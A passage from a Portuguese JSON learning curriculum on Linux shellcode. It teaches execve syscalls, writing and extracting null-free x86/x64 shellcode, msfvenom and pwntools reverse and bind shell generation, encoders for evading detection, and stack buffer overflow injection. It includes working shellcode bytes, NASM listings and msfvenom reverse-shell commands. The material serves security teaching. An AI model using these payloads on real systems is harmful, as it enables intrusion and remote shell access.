                                  "stepNumber": 1,
                                  "title": "Compreender os Fundamentos das Chamadas de Sistema (Syscalls)",
                                  "subSteps": [
                                    "Estude o conceito de syscalls como interface entre userland e kernel em sistemas Unix-like.",
                                    "Identifique o número da syscall para execve (ex: 59 em x86 Linux).",
                                    "Aprenda os registradores padrão usados: eax/rax para número da syscall, ebx/rdi para pathname, etc.",
                                    "Revise o man page de execve para entender assinatura: int execve(const char *pathname, char *const argv[], char *const envp[]);",
                                    "Explore como syscalls são invocadas via int 0x80 (x86 legacy) ou syscall (x64)."
                                  ],
                                  "verification": "Explique em 3 frases o fluxo de uma syscall do user para kernel e retorne.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Man page de execve (man execve)",
                                    "Documentação Linux syscall table (kernel.org)",
                                    "Ferramenta strace para tracing syscalls"
                                  ],
                                  "tips": "Use strace em um comando simples como 'ls' para observar syscalls reais.",
                                  "learningObjective": "Dominar o papel das syscalls como ponte para spawning shells em shellcodes.",
                                  "commonMistakes": "Confundir syscalls com funções da libc; syscalls são diretas ao kernel."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar a Implementação da Syscall execve",
                                  "subSteps": [
                                    "Desenhe o diagrama de argumentos: pathname em rdi, argv em rsi, envp em rdx (x64).",
                                    "Estude como string '/bin/sh' é carregada em memória e endereço passado em rdi.",
                                    "Aprenda a construir argv como array de ponteiros terminando em NULL.",
                                    "Entenda por que envp é frequentemente NULL em shellcodes simples.",
                                    "Simule em pseudocódigo: mov rax, 59; mov rdi, addr_sh; syscall;"
                                  ],
                                  "verification": "Escreva pseudocódigo assembly para chamar execve('/bin/sh', NULL, NULL).",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Assembly reference (x86-64 ABI)",
                                    "Exemplo de shellcode execve do exploit-db",
                                    "Emulador como ndisasm ou objdump"
                                  ],
                                  "tips": "Comece com x64 para simplicidade; evite x86 legacy se possível.",
                                  "learningObjective": "Mapear argumentos de execve aos registradores corretos.",
                                  "commonMistakes": "Esquecer de alinhar ponteiros ou NULL-terminar argv/envp."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar Registradores e Gerar Shellcode Básico",
                                  "subSteps": [
                                    "Escreva código assembly para carregar '/bin/sh\\x00' em um buffer.",
                                    "Configure rdi com endereço do buffer, rsi/rdx com 0.",
                                    "Insira instrução syscall com rax=59.",
                                    "Compile para shellcode: nasm -f elf64 e extraia bytes com objdump.",
                                    "Teste em ambiente sandboxed com gdb ou exploit framework."
                                  ],
                                  "verification": "Gere um shellcode de 20-30 bytes que spawna /bin/sh via execve.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "NASM assembler",
                                    "GDB debugger",
                                    "pwntools Python library para testing",
                                    "Virtual machine isolada"
                                  ],
                                  "tips": "Use seções .text para código nulo-free; evite pushes desnecessários.",
                                  "learningObjective": "Construir configuração de registradores para execução de shellcode.",
                                  "commonMistakes": "Bad chars como NULL em shellcode; use JMP-CALL-POP para strings."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar e Analisar Execução de Shellcode com Syscalls",
                                  "subSteps": [
                                    "Injete shellcode em um programa vulnerável (ex: buffer overflow simples).",
                                    "Use gdb para step-through e ver registradores antes da syscall.",
                                    "Trace com strace para confirmar execve é chamada corretamente.",
                                    "Analise falhas comuns como ASLR ou stack protections.",
                                    "Otimize para shell interativa estável."
                                  ],
                                  "verification": "Execute shellcode e obtenha shell interativa; capture screenshot ou log.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Programa C vulnerável para overflow",
                                    "GDB com gef/peda plugins",
                                    "Strace",
                                    "VM com proteções desabilitadas"
                                  ],
                                  "tips": "Desabilite ASLR temporariamente: echo 0 > /proc/sys/kernel/randomize_va_space.",
                                  "learningObjective": "Validar o papel crítico das syscalls em spawning shells.",
                                  "commonMistakes": "Ignorar endianness ou arquitetura errada (x86 vs x64)."
                                }
                              ],
                              "practicalExample": "Shellcode x64 Linux execve('/bin/sh'): \\x48\\x31\\xff\\x48\\xf7\\xe7\\x52\\x57\\x48\\x89\\xe6\\x48\\x31\\xd2\\xb0\\x3b\\x0f\\x05. Ao injetar em buffer overflow, configura rax=59 (execve), rdi=endereço de '/bin/sh', rsi=0, rdx=0, spawna shell interativa.",
                              "finalVerifications": [
                                "Explique o fluxo de registradores para execve em x64.",
                                "Gere e execute um shellcode funcional.",
                                "Identifique 3 diferenças entre x86 e x64 syscalls.",
                                "Trace uma execução com strace e interprete output.",
                                "Modifique shellcode para usar /bin/bash.",
                                "Discuta impacto de NX/DEP em shellcodes."
                              ],
                              "assessmentCriteria": [
                                "Precisão na configuração de registradores (100% match com ABI).",
                                "Shellcode executa sem crashes e spawna shell.",
                                "Explicação clara do papel das syscalls em 200 palavras.",
                                "Identificação correta de erros comuns em exemplos.",
                                "Conexão com contexto de exploits reais.",
                                "Otimização para tamanho e nul-free."
                              ],
                              "crossCurricularConnections": [
                                "Programação em Assembly: Manipulação de registradores.",
                                "Sistemas Operacionais: Kernel-user interface.",
                                "Segurança da Informação: Exploits e mitigações (ASLR, NX).",
                                "Engenharia Reversa: Análise de binários com gdb/objdump.",
                                "Redes: Shellcodes em contextos remotos (ex: ROP chains)."
                              ],
                              "realWorldApplication": "Em pentesting e CTFs, shellcodes com execve syscalls são usados em buffer overflows para ganhar shell reversa; analistas de malware dissecam para entender payloads em ataques reais como EternalBlue."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.4.2.2",
                        "name": "Geração e Compilação de Shellcodes",
                        "description": "Dominar o processo de escrita em assembly, compilação para código objeto e extração de shellcodes utilizáveis em cenários de injeção.",
                        "specificSkills": [
                          {
                            "id": "10.1.4.2.2.1",
                            "name": "Escrever um shellcode simples em assembly para 32 bits",
                            "description": "Criar código assembly NASM que executa execve('/bin/sh'), configurando registradores EAX=11, EBX=endereço de string, etc., sem null bytes.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a syscall execve e convenções x86 32-bit",
                                  "subSteps": [
                                    "Pesquise o número da syscall execve no Linux x86 32-bit (é 11)",
                                    "Identifique os registradores necessários: EAX=11, EBX=endereço da string '/bin/sh', ECX=0 (argv=NULL), EDX=0 (envp=NULL)",
                                    "Estude como invocar syscall com 'int 0x80'",
                                    "Revise convenções de calling em assembly x86: registradores e stack",
                                    "Anote restrições: shellcode deve ser position-independent e sem bytes nulos (0x00)"
                                  ],
                                  "verification": "Escreva um resumo com syscall number, registradores e interrupção correta",
                                  "estimatedTime": "15-20 minutos",
                                  "materials": [
                                    "Documentação syscalls (man 2 execve ou syscalls.kernel.org)",
                                    "Referência NASM x86",
                                    "Ambiente Linux 32-bit ou VM"
                                  ],
                                  "tips": "Use 'cat /usr/include/asm/unistd_32.h' para confirmar syscall numbers",
                                  "learningObjective": "Dominar os pré-requisitos da syscall execve para shellcode",
                                  "commonMistakes": [
                                    "Usar syscall errada (ex: 59 para x64)",
                                    "Ignorar necessidade de ECX/EDX=0",
                                    "Esquecer int 0x80"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Inicializar registradores ECX e EDX para NULL",
                                  "subSteps": [
                                    "Escreva 'xor ecx, ecx' para zerar ECX (argv=NULL)",
                                    "Escreva 'xor edx, edx' para zerar EDX (envp=NULL)",
                                    "Teste essas instruções isoladamente em um debugger para confirmar zeros",
                                    "Verifique que 'xor' gera código sem bytes nulos",
                                    "Posicione essas instruções no início do shellcode"
                                  ],
                                  "verification": "Execute as instruções em gdb e confirme ECX=EDX=0 sem null bytes",
                                  "estimatedTime": "10-15 minutos",
                                  "materials": [
                                    "NASM assembler",
                                    "GDB debugger",
                                    "Editor de texto (vim/nano)"
                                  ],
                                  "tips": "XOR é eficiente e compacto; evite 'mov ecx, 0' pois gera 0x00",
                                  "learningObjective": "Implementar inicialização segura de registradores sem null bytes",
                                  "commonMistakes": [
                                    "Usar 'mov reg, 0' (insere 0x00)",
                                    "Ordem errada de registradores"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Construir a string '/bin/sh' na stack sem null bytes",
                                  "subSteps": [
                                    "Planeje pushes de dwords invertidos: push edx (zeros), push 0x68732f2f ('//sh'), push 0x6e69622f ('/bin')",
                                    "Escreva as instruções: push edx; push 0x68732f2f; push 0x6e69622f",
                                    "Use 'mov ebx, esp' para apontar EBX para o início da string",
                                    "Confirme que a stack resulta em '/bin//sh\\x00\\x00\\x00\\x00'",
                                    "Inspecione bytes gerados para ausência de 0x00 prematuros"
                                  ],
                                  "verification": "Assemble e dump hexdump da stack em gdb; confirme string e null terminator",
                                  "estimatedTime": "20-25 minutos",
                                  "materials": [
                                    "NASM",
                                    "ld linker",
                                    "objdump ou hexdump",
                                    "GDB"
                                  ],
                                  "tips": "Dwords são little-endian; calcule valores com calculadora hex (ex: 'hs//' = 0x68732f2f)",
                                  "learningObjective": "Criar strings position-independent sem null bytes usando stack",
                                  "commonMistakes": [
                                    "Push na ordem errada (string bagunçada)",
                                    "Cálculo hex incorreto",
                                    "Esquecer push edx para nulls"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Configurar EAX e invocar a syscall",
                                  "subSteps": [
                                    "Escreva 'xor eax, eax' seguido de 'mov al, 11' para EAX=11 sem nulls",
                                    "Adicione 'int 0x80' no final",
                                    "Monte o código completo em NASM",
                                    "Compile: nasm -f elf32 shellcode.asm -o shellcode.o; ld -m elf_i386 shellcode.o -o shellcode",
                                    "Teste execução: ./shellcode (deve spawnar /bin/sh)"
                                  ],
                                  "verification": "Execute o binário e obtenha shell interativa; use strace para confirmar execve",
                                  "estimatedTime": "15-20 minutos",
                                  "materials": [
                                    "NASM",
                                    "ld",
                                    "strace",
                                    "Ambiente Linux i386 compatível"
                                  ],
                                  "tips": "Use 'mov al,11' em vez de 'mov eax,11' para evitar 0x00 em bytes altos",
                                  "learningObjective": "Finalizar shellcode funcional com syscall invocation",
                                  "commonMistakes": [
                                    "EAX com valor errado",
                                    "int 0x80 ausente",
                                    "Falha na linkagem 32-bit"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Otimizar, depurar e verificar o shellcode",
                                  "subSteps": [
                                    "Gere bytes do shellcode: objdump -d shellcode | grep -A20 '<_start>:'",
                                    "Extraia shellcode puro (sem headers) com dd ou python script",
                                    "Teste em ambiente isolado (ex: injetar em buffer overflow simples)",
                                    "Verifique tamanho (<30 bytes) e ausência de 0x00 com hexdump -C",
                                    "Debug com gdb: examine registradores na syscall"
                                  ],
                                  "verification": "Shellcode roda standalone ou em exploit PoC; sem crashes ou nulls",
                                  "estimatedTime": "20-30 minutos",
                                  "materials": [
                                    "objdump",
                                    "hexdump",
                                    "Python para shellcode extraction",
                                    "Buffer overflow tester simples"
                                  ],
                                  "tips": "Script Python: python -c \"print('\\\\x' + '\\\\x'.join(format(b, '02x') for b in open('shellcode.o', 'rb').read()[offset:]))\"",
                                  "learningObjective": "Validar e otimizar shellcode para produção em segurança",
                                  "commonMistakes": [
                                    "Incluir nulls acidentais",
                                    "Falhar em position-independence",
                                    "Testar só em 64-bit"
                                  ]
                                }
                              ],
                              "practicalExample": "Exemplo completo de shellcode NASM x86 32-bit para execve('/bin/sh'):\n\n```assembly\nsection .text\nglobal _start\n_start:\n    xor ecx, ecx\n    xor edx, edx\n    push edx\n    push 0x68732f2f\n    push 0x6e69622f\n    mov ebx, esp\n    xor eax, eax\n    mov al, 11\n    int 0x80\n```\n\nCompilação: `nasm -f elf32 -o shellcode.o shellcode.asm; ld -m elf_i386 -o shellcode shellcode.o`\nExecução: `./shellcode` (spawna shell). Bytes: 29 bytes, sem 0x00.",
                              "finalVerifications": [
                                "Shellcode compila sem erros de assembly ou linkagem",
                                "Execução spawna /bin/sh interativa (ps aux | grep sh)",
                                "Hexdump confirma ausência de bytes 0x00",
                                "Tamanho do shellcode < 35 bytes",
                                "strace mostra execve('/bin//sh', NULL, NULL) com sucesso",
                                "Funciona em gdb: breakpoints confirmam registradores corretos"
                              ],
                              "assessmentCriteria": [
                                "Código usa apenas instruções sem null bytes (xor, push, mov al)",
                                "String '/bin//sh\\x00' construída corretamente na stack",
                                "Registradores setados: EAX=11, EBX=ptr válido, ECX=EDX=0",
                                "Shellcode é position-independent e executável standalone",
                                "Testes passam: spawna shell sem crashes",
                                "Documentação inclui hexdump e explicação de cada instrução"
                              ],
                              "crossCurricularConnections": [
                                "Assembly Language: Instruções x86 e registradores",
                                "Operating Systems: Syscalls e execução de processos",
                                "Reverse Engineering: Análise de binários com objdump/gdb",
                                "Software Vulnerabilities: Buffer overflows e injeção de código",
                                "Cryptography: Encoding shellcodes para bypass filtros"
                              ],
                              "realWorldApplication": "Criar proof-of-concepts para vulnerabilidades de buffer overflow em pentests, resolver desafios CTF em plataformas como HackTheBox/PicoCTF, demonstrar impactos de exploits em treinamentos de segurança, e desenvolver payloads para ferramentas como Metasploit em contextos éticos de red teaming."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.2.1.1"
                            ]
                          },
                          {
                            "id": "10.1.4.2.2.2",
                            "name": "Compilar e extrair shellcode de arquivos objeto",
                            "description": "Usar NASM para montar assembly em objeto, objdump ou hexdump para extrair bytes do shellcode e testá-lo em ambiente controlado como gdb.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Escrever o código assembly para um shellcode simples",
                                  "subSteps": [
                                    "Escolha um shellcode básico, como exit(0) usando syscall.",
                                    "Escreva o código em sintaxe NASM para arquitetura x86 (32-bit), garantindo position-independent code (PIC).",
                                    "Defina a seção de texto com 'section .text' e label '_start'.",
                                    "Use instruções mínimas: mov eax, 1; mov ebx, 0; int 0x80 para sys_exit.",
                                    "Salve o arquivo como 'shellcode.asm'."
                                  ],
                                  "verification": "Código assembly salvo em arquivo .asm sem erros de sintaxe visíveis e pronto para compilação.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Editor de texto (ex: vim, nano)",
                                    "Conhecimento básico de assembly x86 e syscalls Linux"
                                  ],
                                  "tips": "Evite instruções com null bytes (0x00) e prefira registradores sobre endereços absolutos para PIC.",
                                  "learningObjective": "Compreender a estrutura mínima de um shellcode em assembly x86.",
                                  "commonMistakes": [
                                    "Incluir chamadas de biblioteca como printf, que adicionam dependências",
                                    "Usar saltos relativos não PIC",
                                    "Esquecer de alinhar seções corretamente"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Compilar o assembly em arquivo objeto com NASM",
                                  "subSteps": [
                                    "Verifique se NASM está instalado (sudo apt install nasm).",
                                    "Execute o comando: nasm -f elf32 shellcode.asm -o shellcode.o.",
                                    "Confirme a geração do arquivo com ls -la shellcode.o.",
                                    "Use file shellcode.o para verificar o formato (ELF 32-bit).",
                                    "Opcionalmente, objdump -h shellcode.o para inspecionar seções."
                                  ],
                                  "verification": "Arquivo shellcode.o gerado com tamanho >0 e formato ELF 32-bit confirmado.",
                                  "estimatedTime": "10 minutos",
                                  "materials": [
                                    "NASM instalado",
                                    "Terminal em ambiente Linux/Unix"
                                  ],
                                  "tips": "Use -f elf32 para shellcodes x86 tradicionais; elf64 para x64.",
                                  "learningObjective": "Dominar a compilação de assembly para objeto sem linking.",
                                  "commonMistakes": [
                                    "Especificar formato errado (-f bin em vez de elf32)",
                                    "Compilar com linking (ld), que adiciona código extra indesejado",
                                    "Ignorar warnings de sintaxe"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Extrair os bytes do shellcode do arquivo objeto",
                                  "subSteps": [
                                    "Execute objdump -d shellcode.o para disassemblar.",
                                    "Identifique a seção < _start > e copie as instruções machine code (hex bytes).",
                                    "Alternativamente, use hexdump -C shellcode.o | grep após offset de _start.",
                                    "Remova cabeçalhos ELF e padding; isole apenas o código funcional.",
                                    "Converta para array C: unsigned char shellcode[] = \"\\x31\\xc0...\"; e verifique comprimento."
                                  ],
                                  "verification": "Sequência de bytes hex extraída, sem null bytes extras, e comprimento anotado (ex: 7 bytes para exit(0)).",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "objdump ou hexdump (parte de binutils)",
                                    "Editor de texto para anotar bytes"
                                  ],
                                  "tips": "Filtre com objdump -d shellcode.o | grep -A 20 '<_start>:' para foco.",
                                  "learningObjective": "Extrair shellcode puro de binários objeto.",
                                  "commonMistakes": [
                                    "Incluir bytes de cabeçalho ELF",
                                    "Copiar disassembly em vez de hex bytes",
                                    "Deixar null bytes que quebram strings"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar o shellcode em ambiente controlado com GDB",
                                  "subSteps": [
                                    "Crie um loader C: int main() { unsigned char code[] = \"...\"; int (*func)(); func = (int(*)()) code; func(); }.",
                                    "Compile: gcc -z execstack -fno-stack-protector -m32 loader.c -o loader.",
                                    "Rode em GDB: gdb ./loader, set disassembly-flavor intel, break *main+XX, run.",
                                    "Examine registradores e memória com x/10i $pc; continue.",
                                    "Verifique se syscall executa sem segfault (ex: exit code 0)."
                                  ],
                                  "verification": "Shellcode executa no GDB sem crash, syscall completa corretamente.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "GCC instalado",
                                    "GDB debugger",
                                    "Ambiente Linux 32-bit ou compatível"
                                  ],
                                  "tips": "Use -z execstack para permitir execução na stack; desabilite proteções ASLR com echo 0 > /proc/sys/kernel/randomize_va_space.",
                                  "learningObjective": "Validar funcionalidade de shellcode em debugger.",
                                  "commonMistakes": [
                                    "Esquecer flags de compilação (-z execstack, -m32)",
                                    "Não alinhar código no loader",
                                    "Ignorar ASLR/DEP em testes"
                                  ]
                                }
                              ],
                              "practicalExample": "Para shellcode exit(0): assembly 'section .text ; global _start ; _start: xor eax,eax ; mov al,1 ; xor ebx,ebx ; int 0x80'. Compile: nasm -f elf32 exit.asm -o exit.o. Extraia: objdump -d exit.o mostra 31 c0 b0 01 31 db cd 80. Loader C testa execução limpa no GDB.",
                              "finalVerifications": [
                                "Arquivo .o compilado sem erros.",
                                "Bytes shellcode extraídos corretamente (sem headers/padding).",
                                "Shellcode executa no GDB sem segfault ou crash.",
                                "Comprimento exato anotado e sem null bytes indesejados.",
                                "Syscall pretendida (ex: exit) completa com status correto."
                              ],
                              "assessmentCriteria": [
                                "Compilação bem-sucedida com NASM (verificação de arquivo .o).",
                                "Extração precisa de bytes hex (comparação com objdump).",
                                "Teste em GDB demonstra execução controlada e funcional.",
                                "Código PIC e livre de dependências externas.",
                                "Documentação completa do processo (comandos usados)."
                              ],
                              "crossCurricularConnections": [
                                "Programação em Assembly (x86/NASM)",
                                "Análise Reversa de Binários (objdump/GDB)",
                                "Arquitetura de Sistemas Operacionais (syscalls Linux)",
                                "Engenharia de Software Seguro (evitar null bytes)"
                              ],
                              "realWorldApplication": "Em pentests e CTFs, compilar/extrair shellcodes para payloads em exploits de buffer overflow; análise de malware para entender injeções; desenvolvimento de ferramentas de segurança como ROP chains em auditorias."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.2.2.1"
                            ]
                          },
                          {
                            "id": "10.1.4.2.2.3",
                            "name": "Gerar shellcodes com ferramentas automatizadas",
                            "description": "Aplicar msfvenom ou pwntools para gerar shellcodes Linux x86/x64, personalizando payloads e convertendo para formato hexadecimal utilizável.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar o ambiente e instalar ferramentas",
                                  "subSteps": [
                                    "Instale o Kali Linux ou uma VM com ferramentas de pentest pré-instaladas.",
                                    "Atualize o sistema com 'sudo apt update && sudo apt upgrade'.",
                                    "Instale msfvenom via Metasploit: 'sudo apt install metasploit-framework'.",
                                    "Instale pwntools: 'pip3 install pwntools'.",
                                    "Verifique instalações com 'msfvenom --help' e 'pwn --version'."
                                  ],
                                  "verification": "Execute comandos de ajuda das ferramentas sem erros e confirme versões instaladas.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Máquina virtual Kali Linux, acesso à internet, terminal.",
                                  "tips": "Use uma VM isolada para evitar riscos de segurança.",
                                  "learningObjective": "Preparar um ambiente seguro e funcional para geração de shellcodes.",
                                  "commonMistakes": "Esquecer de atualizar pacotes ou instalar em ambiente não isolado."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Gerar shellcode básico com msfvenom para Linux x86",
                                  "subSteps": [
                                    "Execute: 'msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw > shellcode.bin'.",
                                    "Examine o output binário com 'xxd shellcode.bin' para ver bytes hex.",
                                    "Teste o shellcode em um ambiente controlado com nc -lvnp 4444.",
                                    "Compile um exploit simples em C para injetar o shellcode.",
                                    "Execute o exploit e verifique conexão reversa."
                                  ],
                                  "verification": "Shellcode gera conexão reversa bem-sucedida no listener Netcat.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Terminal Kali, Netcat (nc), editor de texto para exploit C, gcc.",
                                  "tips": "Sempre use LHOST e LPORT locais para testes iniciais.",
                                  "learningObjective": "Dominar geração de payloads básicos reversos em x86.",
                                  "commonMistakes": "Usar arquitetura errada (x64 em x86) ou portas em uso."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Personalizar payloads e gerar para x64 com msfvenom",
                                  "subSteps": [
                                    "Gere bind shell: 'msfvenom -p linux/x64/shell_bind_tcp RPORT=4444 -f raw > bind_x64.bin'.",
                                    "Adicione encoders: 'msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -e x86/shikata_ga_nai -i 3 -f hex'.",
                                    "Personalize com variáveis: use -b para bad chars como '\\x00'.",
                                    "Salve em hex diretamente com -f hex.",
                                    "Compare tamanhos e efectividade com xxd ou hexdump."
                                  ],
                                  "verification": "Payload codificado evade detecção básica e executa sem crashes.",
                                  "estimatedTime": "40 minutos",
                                  "materials": "msfvenom, hexdump ou xxd, listener nc multiarquitetura.",
                                  "tips": "Teste encoders em loops para otimizar stealth.",
                                  "learningObjective": "Aplicar personalizações como encoders e bad chars para payloads robustos.",
                                  "commonMistakes": "Ignorar endianness em x64 ou não especificar bad chars corretos."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Gerar shellcodes com pwntools e converter para hex",
                                  "subSteps": [
                                    "Crie script Python: from pwn import *; shellcode = asm(shellcraft.sh()).",
                                    "Gere reverse shell: shellcode = asm(shellcraft.reverse_shell('127.0.0.1', 4444, arch='i386')).",
                                    "Converta para hex: print(shellcode.hex()).",
                                    "Para x64: use arch='amd64' e shellcraft.listen().",
                                    "Valide injetando em C: char *sc = \"\\xhex_bytes\"; e compile/teste."
                                  ],
                                  "verification": "Script Python gera bytes hex válidos que executam como shellcode em teste.",
                                  "estimatedTime": "50 minutos",
                                  "materials": "Python3, pwntools, gcc para teste C, nc listener.",
                                  "tips": "Use shellcraft para templates prontos e evite assembly manual inicial.",
                                  "learningObjective": "Usar pwntools para geração programática e conversão flexível.",
                                  "commonMistakes": "Erro de sintaxe em shellcraft ou mismatch de arquitetura."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Validar e finalizar shellcodes",
                                  "subSteps": [
                                    "Use objdump ou ndisasm para disassemble: 'ndisasm -b 32 shellcode.bin'.",
                                    "Teste em gdb: gdb ./exploit, set {char[LEN]}0xaddr = shellcode.",
                                    "Converta todos para hex puro e documente.",
                                    "Compare msfvenom vs pwntools em tamanho e funcionalidade.",
                                    "Limpe ambiente e documente lições aprendidas."
                                  ],
                                  "verification": "Todos shellcodes disassemblam corretamente e executam sem segfaults.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "gdb, ndisasm/objdump, exploit C template.",
                                  "tips": "Registre hex em arquivo para reutilização em exploits.",
                                  "learningObjective": "Garantir integridade e usabilidade de shellcodes gerados.",
                                  "commonMistakes": "Não null-terminar strings em C ou ignorar null bytes."
                                }
                              ],
                              "practicalExample": "Gere um reverse shell x86 com msfvenom: 'msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.100 LPORT=443 -f hex -e x86/shikata_ga_nai -i 3'. Cole o hex em um buffer overflow exploit C, compile e execute contra vulnerable binary local, confirmando shell no nc -lvnp 443.",
                              "finalVerifications": [
                                "Shellcode executa sem crashes em ambiente x86 e x64.",
                                "Conexões reversas/bind estabelecem corretamente.",
                                "Hex output é limpo, sem bytes inválidos.",
                                "Encoders reduzem detecção (teste com strings/hexdump).",
                                "Pwntools script reproduz msfvenom equivalent.",
                                "Disassembly mostra syscalls corretas (execve/socket)."
                              ],
                              "assessmentCriteria": [
                                "Precisão na geração: payloads funcionais em 100% dos casos.",
                                "Personalização: uso correto de encoders/bad chars (80% redução tamanho).",
                                "Eficiência: tempo de execução <5s, tamanho otimizado.",
                                "Documentação: hex comentado e passos reproduzíveis.",
                                "Segurança: testes apenas em ambiente isolado.",
                                "Versatilidade: suporte x86/x64 com pwntools."
                              ],
                              "crossCurricularConnections": [
                                "Programação em Assembly: compreensão de syscalls Linux.",
                                "Desenvolvimento Python: scripts pwntools para automação.",
                                "Análise Reversa: uso de gdb/ndisasm para validação.",
                                "Redes: conceitos de TCP reverse/bind shells.",
                                "Ética em Cibersegurança: uso responsável em pentests."
                              ],
                              "realWorldApplication": "Em pentests autorizados, gerar shellcodes customizados para bypass de proteções (ASLR/W^X) em exploits de buffer overflow, obtendo acesso remoto em servidores Linux vulneráveis durante avaliações de segurança Red Team."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.2.2.2"
                            ]
                          }
                        ]
                      },
                      {
                        "id": "10.1.4.2.3",
                        "name": "Injeção e Execução de Shellcodes",
                        "description": "Explorar técnicas de injeção em vulnerabilidades como buffer overflow e métodos de execução direta na memória, considerando formatos ELF/PE e proteções modernas.",
                        "specificSkills": [
                          {
                            "id": "10.1.4.2.3.1",
                            "name": "Implementar injeção via buffer overflow",
                            "description": "Construir exploit que sobrescreve EIP com endereço do shellcode em buffer stack-based, usando padrões como NOP sled para alinhamento.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar ambiente vulnerável e analisar o binário",
                                  "subSteps": [
                                    "Compilar um programa C simples com buffer overflow vulnerável usando flags como -fno-stack-protector -z execstack -no-pie.",
                                    "Executar o programa com input longo para confirmar crash (segmentation fault).",
                                    "Usar gdb para depurar e examinar o stack frame no momento do crash.",
                                    "Identificar o endereço base do buffer e estrutura do stack (ebp, eip).",
                                    "Desabilitar ASLR temporariamente para consistência de endereços."
                                  ],
                                  "verification": "Confirme crash reproduzível no gdb e visualize registradores com 'info registers' mostrando EIP corrompido.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "GCC compiler, GDB debugger, programa C vulnerável (ex: strcpy em buffer de 100 bytes), terminal Linux.",
                                  "tips": "Use 'set disable-randomization on' no gdb para testes iniciais.",
                                  "learningObjective": "Compreender a estrutura de stack e pontos de entrada para overflow.",
                                  "commonMistakes": "Esquecer de desabilitar proteções modernas como stack canary ou ASLR, levando a crashes não reproduzíveis."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Desenvolver e testar shellcode",
                                  "subSteps": [
                                    "Escrever shellcode em assembly para execve('/bin/sh') ou similar, evitando null bytes.",
                                    "Montar o shellcode com nasm e extrair bytes hexadecimais.",
                                    "Criar um programa de teste para injetar shellcode em buffer e verificar execução.",
                                    "Testar shellcode isoladamente para garantir spawn de shell sem crash.",
                                    "Codificar shellcode em formato Python para payload futuro."
                                  ],
                                  "verification": "Execute o teste de shellcode e obtenha um shell interativo sem erros.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "NASM assembler, Python para payload, GDB para depuração de shellcode.",
                                  "tips": "Use msfvenom para gerar shellcode inicial e customize para evitar bad chars como \\x00.",
                                  "learningObjective": "Criar código de máquina independente que execute ações arbitrárias.",
                                  "commonMistakes": "Incluir null bytes no shellcode, causando truncamento do payload."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Determinar offset exato para sobrescrita de EIP",
                                  "subSteps": [
                                    "Gerar padrão cíclico com tool como cyclic (pwntools) ou gdb-pattern para input único.",
                                    "Executar programa com padrão e crashar, notando valor corrompido em EIP via gdb.",
                                    "Calcular offset usando cyclic_find no valor de EIP para achar posição exata no input.",
                                    "Validar offset com input manual: padding + marker (ex: 'BBBB') e confirme em EIP.",
                                    "Ajustar para alinhamento se necessário."
                                  ],
                                  "verification": "EIP contenha exatamente o marker (ex: 0x42424242) após input com offset correto.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Pwntools (Python cyclic), GDB.",
                                  "tips": "Salve o core dump com 'gcore' para análise offline se gdb travar.",
                                  "learningObjective": "Precisar calcular distância precisa do buffer até registrador de retorno.",
                                  "commonMistakes": "Offset incorreto devido a alinhamento de stack ou tamanho de argumentos."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Construir e refinar payload completo",
                                  "subSteps": [
                                    "Estruturar payload: NOP sled (200+ \\x90) + shellcode + endereço de retorno (início do NOP sled).",
                                    "Encontrar endereço estável do NOP sled via gdb (ex: esp aponta para ele pós-overflow).",
                                    "Gerar payload em Python: padding (offset bytes) + payload acima.",
                                    "Testar payload no gdb passo a passo, ajustando endereço se desalinhado.",
                                    "Adicionar junk padding se necessário para alinhar EIP perfeitamente."
                                  ],
                                  "verification": "Execute payload e confirme EIP aponta para NOP sled, deslizando para shellcode.",
                                  "estimatedTime": "45 minutos",
